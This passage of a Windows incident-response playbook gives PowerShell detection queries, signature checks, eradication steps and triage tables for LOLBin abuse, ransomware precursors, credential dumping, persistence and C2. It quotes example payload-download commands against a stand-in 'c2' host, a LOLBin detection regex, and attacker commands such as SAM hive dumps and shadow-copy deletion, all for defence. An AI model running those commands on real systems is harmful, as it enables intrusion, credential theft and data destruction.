# BITSAdmin / PowerShell BITS: download
# bitsadmin /transfer job /download /priority normal http://c2/payload c:\temp\payload.exe
# Start-BitsTransfer -Source http://c2/payload -Destination C:\temp\payload.exe

Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} -MaxEvents 2000 |
    Where-Object {$_.Message -match '(?i)(mshta|regsvr32.*scrobj|rundll32.*javascript|odbcconf.*regsvr|wmic.*process.*create|bitsadmin.*download|msiexec.*http)'} |
    ForEach-Object {
        "[$($_.TimeCreated)] $($_.Message -replace '\s+',' ' | ForEach-Object {$_.Substring(0,[Math]::Min(400,$_.Length))})"
    }
```

**Logic breakdown — LOLBin abuse:**

| Result | What it means | Where to go next |
|--------|--------------|-----------------|
| certutil with `-decode` or `-urlcache -f http` in 4688 | Confirmed LOLBin download/decode execution | Extract URL or input file from cmdline; check Temp/AppData for the output file; submit to VT |
| regsvr32 with `/i:http` or `/s /n /u /i:http` | Squiblydoo — COM scriptlet loaded from internet (T1218.010) | Extract URL; pivot to Section 14 for child processes spawned by regsvr32 |
| mshta with HTTP URL or `vbscript:` argument | HTA execution from internet or inline script (T1218.005) | Extract URL; check Section 14 for child processes; correlate with download timestamp (Section 15 Amcache) |
| rundll32 with `javascript:` argument | COM hijack or fileless execution (T1218.011) | Capture full cmdline; Section 14 for spawned children; submit to VT if filename is extractable |
| msiexec with `http://` or `https://` path | Remote MSI execution (T1218.007) | Extract URL; check follow-on persistence (Section 6 scheduled tasks, Section 8 run keys) |
| 0 hits in Security 4688 LOLBin search | Audit policy off, log was cleared, or events pre-date log window | Check Section 16 log health; if memory image available, YARA and LOLBin cmdlines from image (Section 10/11) are still authoritative |
| LOLBin hit in memory YARA scan but 0 in 4688 | Command was executed but not logged (pre-capture or logging gap) | Work from memory image exclusively; treat memory evidence as definitive; note logging gap in investigation notes |
| BITS job URL is CDN / Windows Update domain | Legitimate Windows update download | Close as FP; confirm domain is Microsoft-operated (aka.ms, windowsupdate.com, mp.microsoft.com) |

---

## 19 — Process Signature and DLL Integrity

Verify binaries and loaded DLLs without trusting the file path alone.

**Logic breakdown — signature and integrity:**

| Result | What it means | Where to go next |
|--------|--------------|-----------------|
| Status = Valid, signer = Microsoft Windows | Legitimate signed Windows binary | No action unless binary is running from an unexpected path (Section 8) |
| Status = Valid, signer = known vendor but wrong path | Signed binary in wrong location — possible DLL sideloading | Confirm expected install path for that vendor; check Section 14 for how it was launched |
| Status = NotSigned | No Authenticode signature | Not immediately malicious; combine with path risk — Temp/AppData = escalate; System32 with known name = investigate further |
| Status = HashMismatch | File contents differ from when it was signed (file tampered) | High confidence TP — file was modified after signing; Section 10 carve if process running; Section 20 |
| Status = NotTrusted | Certificate chain does not validate (self-signed or untrusted root) | Investigate the certificate subject; Section 10/11 if process is live |
| Status = Revoked | Certificate explicitly revoked | Definitive malicious indicator — revocation means the cert was misused; Section 20 |
| MSIX / WindowsApps DLL returns NotSigned | MSIX apps are validated at package level; per-file Authenticode is never set | FP — close; verify the binary is under `C:\Program Files\WindowsApps\` |
| In-memory hash differs from on-disk hash | Module is patched in memory (CoW modification) | Confirmed code injection / AMSI bypass; Section 4 if amsi.dll; Section 10/11 for full carve |
| sigcheck `-v` returns non-zero VT detections | VT flags the binary's hash | Escalate; confirm the VT-flagged hash matches `Get-FileHash` output (rule out stale VT cache) |

```powershell
# Check signature of a running process's binary
Get-Process | ForEach-Object {
    try {
        $sig = Get-AuthenticodeSignature $_.Path -ErrorAction Stop
        if ($sig.Status -ne 'Valid') {
            [pscustomobject]@{PID=$_.Id; Name=$_.ProcessName; Path=$_.Path; Sig=$sig.Status; Signer=$sig.SignerCertificate.Subject}
        }
    } catch {}
} | Format-Table -Wrap

# sigcheck: detailed signature check including VirusTotal (optional -v)
& "$T\sigcheck64.exe" -accepteula -nobanner <path_to_binary>
& "$T\sigcheck64.exe" -accepteula -nobanner -v <path_to_binary>   # VT lookup (needs internet)

# Check all DLLs loaded by a process against known-good on-disk hash
$pid_ = <PID>
& "$T\Listdlls64.exe" -accepteula -p $pid_ | Select-String -Pattern 'dll' | ForEach-Object {
    $path = ($_ -split '\s+' | Where-Object {$_ -match '\.dll$'})[0]
    if ($path -and (Test-Path $path)) {
        $hash = (Get-FileHash $path -Algorithm SHA256).Hash
        [pscustomobject]@{Path=$path; SHA256=$hash}
    }
}

# Compare an in-memory module dump against its on-disk copy
$onDisk  = (Get-FileHash 'C:\Windows\System32\<module>.dll' -Algorithm SHA256).Hash
# After dumping in-memory copy with Analyze-Memory.ps1 or procdump:
$inMemory = (Get-FileHash '<dump_path>' -Algorithm SHA256).Hash
if ($onDisk -ne $inMemory) {
    Write-Host "MISMATCH: <module>.dll is patched in memory"
    Write-Host "  On-disk:  $onDisk"
    Write-Host "  In-memory: $inMemory"
} else {
    Write-Host "MATCH: <module>.dll identical to on-disk copy"
}
```

---

## 19b — Feeding Manual Findings into Eradication

`Invoke-Eradication.ps1` reads only from `Adjudication_*.json` produced by the automatic pipeline. When further investigation (live VAD analysis, enrichment, corroboration) surfaces additional true positives not captured there, use `Add-ManualFinding.ps1` to record them in the same schema.

```powershell
# Dry-run a process finding (shows planned action, writes nothing)
.\playbooks\windows\threat_hunting\Add-ManualFinding.ps1 `
    -HostFolder .\reports\<host> `
    -Type Process `
    -Target "svchost (PID: 4392)" `
    -SubjectPath "C:\Windows\System32\svchost.exe" `
    -Details "AMSI in-memory hash mismatch; amsi.dll CoW-patched in this PID" `
    -MITRE "T1562.001 (Disable or Modify Tools)" `
    -Notes "VAD -wx on amsi.dll page; vol.exe hash differs from on-disk"

# Write the finding (add -Confirm)
.\playbooks\windows\threat_hunting\Add-ManualFinding.ps1 `
    -HostFolder .\reports\<host> `
    -Type Process -Target "svchost (PID: 4392)" `
    -SubjectPath "C:\Windows\System32\svchost.exe" `
    -Details "AMSI in-memory hash mismatch confirmed" `
    -MITRE "T1562.001 (Disable or Modify Tools)" `
    -Confirm

# Add a scheduled task persistence finding
.\playbooks\windows\threat_hunting\Add-ManualFinding.ps1 `
    -HostFolder .\reports\<host> `
    -Type ScheduledTask `
    -Target "Task: \Microsoft\Windows\UpdateBadgeName" `
    -Details "Task action runs encoded PowerShell from Temp; not a legitimate Windows task" `
    -MITRE "T1053.005 (Scheduled Task)" `
    -Confirm

# Add a C2 endpoint discovered during investigation (feeds firewall block)
.\playbooks\windows\threat_hunting\Add-ManualFinding.ps1 `
    -HostFolder .\reports\<host> `
    -AddC2Endpoint "198.51.100.44:4444" -Confirm

# Add memory-derived artifacts (from enrichment) to IOCs.json review surface
.\playbooks\windows\threat_hunting\Add-ManualFinding.ps1 `
    -HostFolder .\reports\<host> `
    -AddMemoryArtifact "C:\Users\Public\svc.exe" -ArtifactKind File -Confirm

.\playbooks\windows\threat_hunting\Add-ManualFinding.ps1 `
    -HostFolder .\reports\<host> `
    -AddMemoryArtifact "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Updater" `
    -ArtifactKind RegKey -Confirm

# Run eradication against manual findings only (pass the generated file)
.\Invoke-Eradication.ps1 `
    -HostFolder .\reports\<host> `
    -AdjudicationPath .\reports\<host>\ManualFindings_<host>.json

# Or combine: pass both the auto adjudication and the manual supplement
# by merging them: (auto adj) + (manual findings) -> pass manual as AdjudicationPath
# Invoke-Eradication auto-picks newest Adjudication_*.json from HostFolder;
# use -AdjudicationPath explicitly for the manual file and run a second pass.
```

**Type -> handler mapping (what `Invoke-Eradication.ps1` does with each type):**

| `-Type` value | Target format required | Automated action |
|---------------|----------------------|-----------------|
| `Process` | `"ProcessName (PID: NNN)"` | Kill PID + quarantine binary |
| `ScheduledTask` | `"Task: \Path\TaskName"` | Disable + unregister task |
| `COM` | `"{CLSID-GUID}"` | Remove HKCU/HKLM CLSID server key |
| `BITS` | `"Job: DisplayName"` | Remove BITS transfer job |
| `RemoteAccess` | Tool name string | Kill processes + disable service |
| `DefenderExclusion` | Exclusion path | `Remove-MpPreference -ExclusionPath` |
| `Manual` | Any string | No automated action; appears in report |

**What feeds where in Invoke-Eradication:**

| Data source | Where it goes | Effect |
|------------|--------------|--------|
| `ManualFindings_<host>.json` via `-AdjudicationPath` | Main action loop | Kill/quarantine/unregister as above |
| `IOCs.json` `c2_endpoints[]` via `-AddC2Endpoint` | Firewall restore step | Outbound block + hosts sinkhole per C2 |
| `IOCs.json` `memory_eradication{}` via `-AddMemoryArtifact` | Memory scope surface | Analyst-review printout (not auto-deleted) |

---

## 20 — Eradication Pivot

Once triage is complete and findings are documented, use the numbered playbooks to contain, eradicate, and restore. These are analyst-gated — they require explicit decision at each step.

```powershell
# 1. Contain: block C2 egress, disable lateral movement paths
.\playbooks\windows\01_Contain-Host.ps1 -IncidentId <id> -OutDir reports\<host>\

# 2. Eradicate processes: kill confirmed malicious PIDs
.\playbooks\windows\02_Eradicate-Process.ps1 -IncidentId <id> -OutDir reports\<host>\

# 3. Eradicate persistence: remove Run keys, tasks, services, IFEO entries
.\playbooks\windows\03_Eradicate-Persistence.ps1 -IncidentId <id> -OutDir reports\<host>\

# 4. Block C2: add firewall rules for recovered IPs and domains
.\playbooks\windows\04_Block-C2.ps1 -IncidentId <id> -OutDir reports\<host>\

# 5. Acquire artifact: preserve evidence before any restoration
.\playbooks\windows\05_Acquire-Artifact.ps1 -IncidentId <id> -OutDir reports\<host>\

# 6. Restore: re-enable blocked services, verify integrity
.\playbooks\windows\06_Restore-Host.ps1 -IncidentId <id> -OutDir reports\<host>\
```

**Logic breakdown — eradication pivot:**

| Result | What it means | Where to go next |
|--------|--------------|-----------------|
| `Invoke-Eradication.ps1` dry-run output looks correct | All intended actions listed; nothing unexpected | Review output; approve with `-Apply` |
| Eradicate-Process: PID not found | Process already exited or was previously killed; persistence may still be live | Proceed to Eradicate-Persistence — persistence cleanup is valid even after the process is gone |
| Block-C2: 0 IPs blocked | `IOCs.json` has no C2 entries yet | Run memory enrichment first (Section 11); re-run block step after `IOCs.json` is populated |
| Post-eradication: PID reappears | Persistence mechanism survived (not captured in IOC/persistence sweep) | Re-run Section 6 (scheduled tasks), Section 8 (run keys), Section 3 (WMI); run Autoruns to find what is relaunching the process |
| Eradication fails on a protected process | Binary is PPL-protected (LSASS, system critical) or antitamper is blocking | Document; escalate; re-image may be required if a system binary is confirmed compromised |
| Restore: firewall state mismatch | Rollback journal doesn't match current state (reboot or Defender changed rules during investigation) | Manual review of firewall rules; restore from `.wfw` backup: `netsh advfirewall import <backup.wfw>` |
| After eradication, new external connection appears | Attacker had a backup persistence path not in the eradication scope | Re-enter Section 8 → Section 6 → Section 3 sweep; egress observation window still running (Section 7) |

**Prerequisites before running eradication:**
- Memory enrichment complete (`Memory_Enrichment.md` reviewed — eradication IOCs in `IOCs.json`)
- Attack chain documented (`Attack_Graph.md` includes memory-derived chain)
- Timeline correlation complete (`Timeline_Correlation.md` — entry vector known)
- All open/suspicious findings either closed as FP or escalated to TP
- Backup / snapshot taken of affected system before any changes

---

## Quick Reference: Common FP Patterns

| Signal | Common FP Explanation | Confirm or clear |
|--------|----------------------|-----------------|
| Orphaned Parent on `explorer.exe` | `userinit.exe` exits by design after starting explorer | FP — close unless other corroborating signals |
| YARA in `anon ---` (no perms) | Decommitted heap in JIT process (Electron/CLR/V8) | FP if single match; no action |
| YARA in `anon r--` | Non-executable anonymous region (data/heap) — not code execution context | FP for code injection; still note for data exfil potential |
| LOLBin in `CRYPT32.dll` / `cryptnet.dll` | CertUtil is a thin wrapper around CRYPT32; CRYPT32/cryptnet legitimately contain BITS and cert-download strings | FP — close; fires across virtually all processes that load crypto DLLs |
| LOLBin in `capauthz.dll` (RPCSS / svchost) | BITS uses COM/RPC; capauthz = capability auth for RPC | FP — close |
| LOLBin in `shlwapi.dll` / `SHLWAPI.dll` | shlwapi.dll contains shell/URL utility functions legitimately; LOLBin strings appear in virtually every Windows process | FP — close; if this fires, look at whether the same PID also has a named-family rule hit |
| LOLBin in `wbemcomn.dll` / `XmlLite.dll` / `wusys.dll` / `virtdisk.dll` | These Windows DLLs contain BITS/network-related strings in their legitimate code | FP — close |
| `Win32_DeviceGuard` WMI errors (0x80041032) | SecurityHealthService polling HVCI on non-VBS system | FP — close |
| WSL HyperV firewall rule errors | wslservice managing WSL networking rules | FP — close |
| JIT regions in pwsh/node/Code.exe | .NET CLR or V8 JIT compiled code — normal | FP if no named-family YARA in same region |
| `-EncodedCommand` or `-ExecutionPolicy Bypass` in pwsh cmdline | IR toolkit, VS Code, PowerShell Editor Services, and many admin scripts use these flags | Verify parent process — if parent is a known development tool or VS Code terminal: FP |
| MSIX/WindowsApps DLL unsigned per-file | OS validates MSIX at package level; per-file Authenticode returns NotSigned by design | FP — close |
| Multiple threat intel rules (CobaltStrike, REDLEAVES, WiltedTulip, etc.) in `anon rw-` for a security tool or threat intel data store process | Security products, threat intel platforms, and SIEM agents load known-malicious signatures and IOC databases into their working memory — these strings appear as YARA hits | FP — close; the `anon rw-` region is data (non-executable); check that the owning process is a known security tool and the region has no execute flag |
| Named-family YARA hit in a data-only region (`anon rw-` or `anon r--`) of a known security tool | Security products may cache decoded threat intelligence, detonated sample artifacts, or encoded IOC lists in non-executable memory | FP — close if region is non-executable; confirm owning process is a known security product |
| Memory capture tool (go-winpmem, winpmem, etc.) matching LOLBin rules | The capture tool reads all memory including memory that contains malware samples | FP — always exclude the capture process PID from analysis |
| Netsh Helper DLL "(unresolved: xxx.dll)" for standard Windows helpers | The persistence snapshot adjudicator flags netsh helpers without full path; all standard Windows helpers (ifmon, rasmontr, dhcpcmonitor, nshhttp, nshipsec, etc.) are listed without path | FP — close if the DLL name matches a known Windows netsh component |
| PEB CommandLine Buffer Pointer Anomaly for a PID no longer running | The PEB pointer was read after the process exited or was recycled; the buffer at that address is unmapped because the process is gone | FP — confirm PID is no longer running; note for baseline |
| Dormant Beacon Candidate in LsaIso.exe / NgcIso.exe / security processes | VTL1 / VSM isolation processes contain high-entropy key material by design | FP unless `AdjAnonExec=True` or confirmed cross-process write targeting the region |
| AdobeCollabSync "Network scanner/listener" signal | Adobe's collaboration feature performs local network discovery (mDNS/listener sockets) to find other Acrobat instances | Confirm via HKCU Run key and process signature; if signed and in HKCU Run = FP |
| Named pipe with GUID format | COM activation pipes, RPC endpoints, and Windows internal IPC channels regularly use GUID format | Run `handle64.exe -a \Device\NamedPipe\<guid>` to identify owner; if owner is a system or signed process = FP |
| Service binary "outside standard directories" at Medium | EDR Toolkit v2+ flags service paths outside Windows/Program Files as Medium; many vendor services install to custom paths | Verify binary is signed (`sigcheck64.exe -e -u <path>`) and path hasn't changed since install; if signed vendor binary = confirm benign |
| BITS job downloading to AppData/Temp at High | Microsoft Edge, Windows Update, and NVIDIA update managers use BITS with Temp staging; destination path IS the staging mechanism | Check source URL domain against Microsoft/vendor CDN; if source is known-good vendor CDN + job state = Transferred → confirm benign Edge/WU update |

---

## 21 — Impact and Pre-Ransomware Indicators

**Triggered by:** EDR Toolkit findings of type `VSS Deletion`, `Recovery Disable`, `Archive Staging`, `WSL Suspicious Execution`, `WSL Parent Spawn`

These detections fire on active processes — check immediately, as these indicate an attack is actively executing or has recently executed.

```powershell
# Confirm VSS shadow copies still exist (if deletion was attempted)
vssadmin list shadows

# Check bcdedit recovery status
bcdedit /enum {default} | Select-String -Pattern "recovery|bootstatuspolicy"

# Find any recently-created archives in staging locations (last 24h)
Get-ChildItem -Path $env:TEMP,$env:APPDATA,"C:\Users\Public" -Recurse -ErrorAction SilentlyContinue |
    Where-Object { $_.Extension -match '\.(zip|7z|rar|tar|gz)' -and $_.LastWriteTime -gt (Get-Date).AddHours(-24) } |
    Select-Object FullName, Length, LastWriteTime

# Check for any FTP/SCP processes currently running
Get-Process | Where-Object { $_.Name -match '^(ftp|scp|sftp|pscp)$' } | Select-Object Id, Name, Path
```

**Logic breakdown:**

| Finding | Severity | What it means | Immediate action |
|---------|----------|--------------|-----------------|
| `VSS Deletion` — vssadmin delete shadows | Critical | Pre-ransomware: attacker removing recovery path before encryption | **Contain immediately.** Kill process if still running; isolate host; check all VSS copies gone |
| `VSS Deletion` — wmic shadowcopy delete | Critical | Same mechanism via WMI | Same as above |
| `Recovery Disable` — bcdedit recoveryenabled no | High | Ransomware payload ensuring no OS recovery after reboot | Check if also paired with VSS deletion (double-whammy pattern); escalate to incident |
| `Archive Staging` — 7z/rar/Compress-Archive to Temp/AppData/Public | High | Data collection before exfil; attacker staging compressed data | Check archive destination, size, and timestamp; correlate with network connections from same PID |
| `WSL Suspicious Execution` — wsl.exe curl/wget/bash -c | High | Attacker using Linux subsystem to evade Windows hooks | Check `wsl.exe` cmdline for download URL; inspect `%USERPROFILE%\AppData\Local\Packages\CanonicalGroup*\LocalState` for dropped files |
| `WSL Parent Spawn` — cmd.exe/powershell.exe parent=wsl.exe | High | Windows code executing via Linux-side invocation (hook evasion) | Inspect the spawned process cmdline; correlate with Section 14 parent-chain analysis |

> **Future automation hook:** If `VSS Deletion` fires, automatically trigger containment phase (`01_Contain-Host.ps1 -ImmediateIsolate`) without analyst confirmation — no legitimate admin workload deletes all shadows silently.

---

## 22 — Credential Access Detection

**Triggered by:** EDR Toolkit findings of type `Credential Hive Dump`, `Credential Vault Access`, `Browser Credential Access`, `LSASS Memory Dump`

```powershell
# Verify credential hive was not successfully saved (check for .hiv / .save files)
Get-ChildItem -Path C:\,$env:TEMP,$env:USERPROFILE -Recurse -ErrorAction SilentlyContinue |
    Where-Object { $_.Extension -match '\.(hiv|save|reg)' -and $_.Length -gt 1MB } |
    Select-Object FullName, Length, LastWriteTime | Sort-Object LastWriteTime -Descending

# Check if cmdkey stored anything unusual
cmdkey /list

# Look for browser credential DB copies outside profile (mechanism: non-browser access)
@(
    "$env:TEMP\Login Data",
    "$env:USERPROFILE\AppData\Local\Temp\Login Data",
    "C:\Users\Public\Login Data",
    "$env:TEMP\logins.json"
) | Where-Object { Test-Path $_ } | ForEach-Object { Write-Host "FOUND: $_" }

# Check recent LSASS dump artifacts (>10MB in user-writable paths)
Get-ChildItem -Path $env:TEMP,"C:\Users\Public",$env:APPDATA -Filter "*.dmp" -ErrorAction SilentlyContinue |
    Where-Object { $_.Length -gt 10MB } | Select-Object FullName, Length
```

**Logic breakdown:**

| Finding | Severity | What it means | Where to go next |
|---------|----------|--------------|-----------------|
| `Credential Hive Dump` — reg save HKLM\SAM | Critical | SAM hive contains local account NTLM hashes — offline cracking risk | Check for .hiv output file; if found, quarantine; change all local account passwords |
| `Credential Hive Dump` — reg save HKLM\SECURITY | Critical | SECURITY hive contains LSA secrets, cached domain credentials | Same; also audit domain accounts if domain-joined |
| `Credential Vault Access` — cmdkey /list | High | Attacker enumerating all stored Windows Credential Manager entries | Check what's stored: `cmdkey /list`; rotate any RDP, network share, or VPN credentials stored there |
| `Credential Vault Access` — cmdkey /add | Medium | Attacker storing their own credential for lateral movement | Identify the target (`/add:...`) — this is the next lateral movement destination |
| `Browser Credential Access` — non-browser accessing Chrome profile | High | Attacker copying `Login Data` SQLite or reading it in-place | Check if `Login Data` file was recently copied; all saved browser passwords should be rotated |

> **Future automation hook:** When `Credential Hive Dump` fires, automatically trigger password reset notification workflow and disable affected accounts pending investigation.

---

## 23 — Behavior-Based Persistence Registry Triage

**Triggered by:** EDR Toolkit findings of type `AppCertDLLs Injection`, `Accessibility Feature Hijack`, `IFEO GlobalFlag Hijack`, `IFEO Debugger Hijack`, `Active Setup Persistence`, `Suspicious Print Monitor DLL`, `Unquoted Service Path`

```powershell
# AppCertDLLs — any value here is immediately suspicious
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDLLs" -ErrorAction SilentlyContinue

# IFEO — check all entries for Debugger values
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" |
    ForEach-Object {
        $dbg = (Get-ItemProperty $_.PSPath -Name Debugger -ErrorAction SilentlyContinue).Debugger
        $gf  = (Get-ItemProperty $_.PSPath -Name GlobalFlag -ErrorAction SilentlyContinue).GlobalFlag
        if ($dbg -or $gf) {
            [PSCustomObject]@{ Binary=$_.PSChildName; Debugger=$dbg; GlobalFlag="0x$($gf.ToString('X'))" }
        }
    } | Format-Table -AutoSize

# Active Setup — all entries with non-system32 StubPath
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components" |
    ForEach-Object {
        $stub = (Get-ItemProperty $_.PSPath -Name StubPath -ErrorAction SilentlyContinue).StubPath
        if ($stub -and $stub -notmatch '(?i)^("?[a-z]:\\windows\\(system32|syswow64)\\)?(rundll32|regsvr32)') {
            [PSCustomObject]@{ GUID=$_.PSChildName; StubPath=$stub }
        }
    }

# Port monitors — all non-system32 DLL registrations
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors" -ErrorAction SilentlyContinue |
    ForEach-Object {
        $drv = (Get-ItemProperty $_.PSPath -Name Driver -ErrorAction SilentlyContinue).Driver
        if ($drv -and $drv -notmatch '(?i)^[a-z]:\\windows\\system32\\') {
            [PSCustomObject]@{ Monitor=$_.PSChildName; Driver=$drv }
        }
    }
```

**Logic breakdown:**

| Finding | Severity | What it means | Remediation |
|---------|----------|--------------|------------|
| `AppCertDLLs Injection` | Critical | DLL injected into every CreateProcess call — persistence with maximum reach | Remove the registry value; quarantine the DLL; re-image likely required |
| `Accessibility Feature Hijack` (sethc/utilman) | Critical | Pressing accessibility key at Windows login yields SYSTEM shell | Remove IFEO Debugger value; check if attacker already used it (event log 4688 sethc.exe spawning cmd.exe) |
| `IFEO Debugger Hijack` | High/Medium | Every launch of the target binary runs attacker binary first | Remove Debugger value; verify what the Debugger binary does; quarantine if malicious |
| `IFEO GlobalFlag Hijack` | High | Silent process replacement via FLG_APPLICATION_VERIFIER + SilentProcessExit | Remove GlobalFlag value; check `HKLM:\...\SilentProcessExit\<binary>` for monitoring key |
| `Active Setup Persistence` (High) | High | LOLBin or staging-path stub runs on every user's first logon | Remove the GUID entry; trace what the StubPath does; check if it already executed (event 4688) |
| `Active Setup Persistence` (Medium) | Medium | Non-standard StubPath — could be legitimate vendor or attacker | Verify vendor identity; check binary signature (`sigcheck64.exe`); confirm against known good baseline |
| `Suspicious Print Monitor DLL` (High) | High | Non-system32 DLL loaded by SYSTEM spoolsv.exe at boot | Remove the Driver registry value; quarantine the DLL; check if attacker already has SYSTEM foothold |
| `Unquoted Service Path` | High | Service path with spaces and no quotes — attacker can plant binary in parent directory | Quote the path in the registry; check if exploitable parent directory is user-writable |

> **Future automation hook:** `AppCertDLLs Injection` → auto-remove registry value and quarantine DLL without analyst review (no benign use exists). `Accessibility Feature Hijack` → same.

---

## 24 — C2 Channel Detection (Network)

**Triggered by:** EDR Toolkit findings of type `DoH Beacon`, `SMTP Exfiltration`, `Raw File Transfer`, `Suspicious BITS Job` (StagingDestination), `Suspicious Named Pipe` (GUID)

```powershell
# Identify the process owning a suspicious named pipe
$pipeName = '<guid-from-finding>'
& ".\tools\handle64.exe" -accepteula -nobanner -a "\Device\NamedPipe\$pipeName" 2>$null

# Check active connections from process flagged for DoH/SMTP
$pid = <pid-from-finding>
Get-NetTCPConnection | Where-Object { $_.OwningProcess -eq $pid } |
    Select-Object LocalPort, RemoteAddress, RemotePort, State

# Inspect BITS jobs for staging destinations
Get-BitsTransfer -AllUsers | ForEach-Object {
    $fl = $_.FileList | Select-Object -First 1
    [PSCustomObject]@{ Name=$_.DisplayName; URL=$fl.RemoteName; Dest=$fl.LocalName; State=$_.JobState }
} | Format-Table -AutoSize -Wrap

# Resolve a DoH resolver IP to confirm it's a known DoH provider
@('1.1.1.1','8.8.8.8','9.9.9.9','208.67.222.222','185.228.168.9') |
    ForEach-Object { Write-Host "  $_ = $([System.Net.Dns]::GetHostEntry($_).HostName 2>$null)" }
```

**Logic breakdown:**

| Finding | Severity | What it means | Investigation path |
|---------|----------|--------------|-------------------|
| `DoH Beacon` — non-browser HTTPS to 1.1.1.1/8.8.8.8/9.9.9.9 | High | C2 beacon using DNS-over-HTTPS to bypass DNS logging | Identify owning PID; check full connection list; capture traffic if possible; DNS-over-HTTPS C2 has no DNS cache — look for payload in process memory enrichment |
| `SMTP Exfiltration` — non-mail process on port 25/587 | High | Credential relay (spam) or data exfiltration via email | Identify process; check what data is accessible to it; check if it's a new/unknown process |
| `Raw File Transfer` — ftp.exe/scp.exe active | High | Explicit file transfer tool active — exfil or payload delivery | Check process cmdline for destination IP/host; check filesystem for transferred files |
| `Suspicious BITS Job` — StagingDestination flag | High | Executable or script being downloaded to staging area | Check URL source domain; check destination path for what was downloaded; verify job state |
| `Suspicious Named Pipe` — GUID format | Medium | Structural C2 indicator (framework randomized its pipe name) | Use `handle64.exe` to find owning process; corroborate with Section 5 shellcode thread or Section 11 memory enrichment |

> **Future automation hook:** `DoH Beacon` → auto-block outbound HTTPS to known DoH resolver IPs from non-browser processes via Windows Firewall (`netsh advfirewall firewall add rule`).

---

## 25 — Memory Evasion Module Triage (Modules 20-22)

**Triggered by:** Memory forensic findings of type `Direct Syscall Execution`, `Process Ghosting (Deleted Image)`, `ETW-TI Provider Disabled`

These findings indicate sophisticated evasion techniques. They require memory image analysis — run against the AFF4 capture.

```powershell
# Check ETW-TI status on live host (before memory analysis)
$provider = Get-WinEvent -ListProvider "Microsoft-Windows-Threat-Intelligence" -ErrorAction SilentlyContinue
if ($provider) { Write-Host "ETW-TI: REGISTERED ($($provider.LogLinks.Count) log links)" }
else           { Write-Host "ETW-TI: NOT FOUND -- provider may have been unregistered" }

# For Direct Syscall finding: look at the PID and correlate with injection findings
# The 0x0F 0x05 (syscall) opcode in anonymous private exec memory outside ntdll
# indicates Hell's Gate / Halo's Gate / SysWhispers shellcode
# Follow up with memory enrichment (Section 11) for that PID

# For Process Ghosting: the backing file is gone -- no disk artifact
# Use memory carve (Section 10) to dump the in-memory PE before it exits
$py = ".\tools\memprocfs\python\python.exe"
& $py .\playbooks\windows\threat_hunting\vad_query.py "C:\Captures\<host>.aff4" <pid> <vad_addr_hex>
```

**Logic breakdown:**

| Finding | Severity | What it means | Investigation path |
|---------|----------|--------------|-------------------|
| `Direct Syscall Execution` — 3+ syscall opcodes in anonymous exec VAD outside ntdll | High | Hell's Gate / SysWhispers pattern: shellcode issuing system calls directly to bypass user-mode API hooks | Enrichment won't find ntdll-rooted strings; look at capa output for the carved region; C2 config may be in adjacent VAD |
| `Process Ghosting (Deleted Image)` | High | Process image file was deleted — no on-disk artifact for AV to scan; payload lives in memory only | **Carve immediately** (Section 10) before process exits; carved binary is your only artifact for reverse engineering |
| `ETW-TI Provider Disabled` | Critical | The kernel telemetry channel feeding most EDRs is blind; attacker patched kernel callbacks | Check ntdll hooks (Module 12 output) and kernel callback arrays; escalate to SOC immediately — this machine's EDR is deaf |

**Module 20 — Direct Syscall — FP pattern:**
`_SYSCALL_BYTES` (`0x0F 0x05`) can appear at low density in JIT-compiled code (CLR, V8) as the JIT happens to emit those bytes in other contexts. The threshold of 3+ occurrences filters most of these. If Module 20 fires on a JIT host (pwsh, dotnet, chrome) with a count near the threshold (3-5), corroborate with Module 3 (anonymous exec VAD) for the same PID.

**Module 22 — ETW-TI — API availability note:**
The ETW-TI state is only queryable in vmmpyc builds with `vmm.kernel.etw_ti_state` support. If the module logs "API unavailable — skipped," the check did not run. Use the live-host PowerShell command above to verify directly.

> **Future automation hook:** `ETW-TI Provider Disabled` → immediately isolate host and page on-call SOC analyst. This is a Critical indicator of a sophisticated attacker with kernel-level control.

---

## 26 — Module 5 VAD Triage Workflow (vad_query.py)

**Triggered by:** `Shellcode Thread (Memory)` findings from memory_forensic.py — the first triage step before any other investigation.

> This is the Phase 1 workflow fix. Previously, Module 5 findings were always `High` severity and required manual follow-up. Now, severity is set automatically by the VAD type. This section documents the logic for cases where `vad_type` is unknown or needs manual verification.

```powershell
# Quick VAD lookup: given a thread start address, classify the backing memory
$py  = ".\tools\memprocfs\python\python.exe"
$aff = "C:\Captures\memory_<host>.aff4"
& $py .\playbooks\windows\threat_hunting\vad_query.py $aff <pid> <thread_start_hex>

# Output interpretation:
#   type=anon_exec  prot=*RWX*  -> High: genuine shellcode in anonymous executable memory
#   type=image                  -> Medium: DLL loaded but not in PEB list (corroborate with Module 3)
#   "no VAD covers this address"-> Low: DLL unloaded after thread created (FP — explorer shell ext pattern)
#   type=anon_noexec            -> Medium: perms dropped after injection (W^X sleep-mask)
```

**Automatic severity mapping (as of Phase 1 refactor):**

| `vad=` in finding | Severity | Meaning | Action |
|-------------------|----------|---------|--------|
| `anon_exec` | **High** | Thread starts in anonymous executable memory — classic shellcode injection | Proceed to enrichment (Section 11); check Module 3 for adjacent regions |
| `image` | **Medium** | Thread starts in file-backed DLL not in PEB list | Corroborate with Module 3; if no anonymous exec VAD in same PID → downgrade to Low |
| `unmapped` | **Low** | DLL was unloaded after thread was created | FP — close. Common in explorer.exe shell extensions |
| `anon_noexec` | **Medium** | Anonymous region, no exec permission at snapshot (W^X sleep masking) | Check Module 13 dormant beacon in same PID; if beacon found → escalate |

---

## 27 — IOCs.json Review and Enrichment Gate

**Triggered by:** After any memory enrichment run (`memory_enrich.py`). Must be done BEFORE running `Invoke-Eradication.ps1`.

> **Critical gate:** `memory_enrich.py` automatically promotes all recovered domains from process memory to `c2_endpoints[]`. This includes cert-authority OCSP/CRL endpoints, vendor CDN domains, and namespace URIs from the working memory of FP PIDs. Running eradication against an unreviewed `IOCs.json` will sinkhole legitimate infrastructure.

```powershell
# Step 1: Check what was promoted to c2_endpoints
$iocs = Get-Content .\reports\<host>\IOCs.json | ConvertFrom-Json
Write-Host "c2_endpoints count: $($iocs.c2_endpoints.Count)"
$iocs.c2_endpoints | Select-Object host, country, source | Format-Table

